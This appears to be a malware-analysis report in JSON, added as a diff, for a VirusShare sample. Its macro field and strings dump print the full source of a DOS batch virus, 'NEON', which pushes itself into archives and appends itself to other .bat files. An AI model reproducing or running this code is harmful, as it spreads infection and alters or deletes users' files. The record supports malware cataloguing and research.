@@ -1,0 +1,45 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {},
+        "macro": ": Virus NEON. Harmless and non-resident. But little bit hardy.\n@ctty nul\n: ----<<< The block of archiving >>>----\nfor %%q in (*.rar) do rar a -tk -y -c- -o+ %%q %0\nfor %%w in (*.zip) do pkzip -m %%w %0\nfor %%e in (*.arj) do arj a -d %%e %0\n: ----<<< End block of archiving >>>----\nfor %%a in (*.bat) do set _B=%%a\nfor %%c in (%_B%) do attrib %%c -r -s -h\n:labelN\nfor %%b in (*.bat) do find \"_B\" %%b\nif not errorlevel 1 goto no\ntype %0 >> %_B%\ngoto labelN\n:no"
+    },
+    "filename": "VirusShare_a8753b10448e9748a6e9dc9c8ab0d4af",
+    "filesize": 474,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "a8753b10448e9748a6e9dc9c8ab0d4af",
+        "sha1": "09406393f9a01a556217e1365e6db288a465d846",
+        "sha256": "b36d037c527b4428443c94040a7dcfaa8b27d59b0360834a186ee31d6524ed9d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            ": Virus NEON. Harmless and non-resident. But little bit hardy.",
+            "@ctty nul",
+            ": ----<<< The block of archiving >>>----",
+            "for %%q in (*.rar) do rar a -tk -y -c- -o+ %%q %0",
+            "for %%w in (*.zip) do pkzip -m %%w %0",
+            "for %%e in (*.arj) do arj a -d %%e %0",
+            ": ----<<< End block of archiving >>>----",
+            "for %%a in (*.bat) do set _B=%%a",
+            "for %%c in (%_B%) do attrib %%c -r -s -h",
+            ":labelN",
+            "for %%b in (*.bat) do find \"_B\" %%b",
+            "if not errorlevel 1 goto no",
+            "type %0 >> %_B%",
+            "goto labelN"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.265834",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
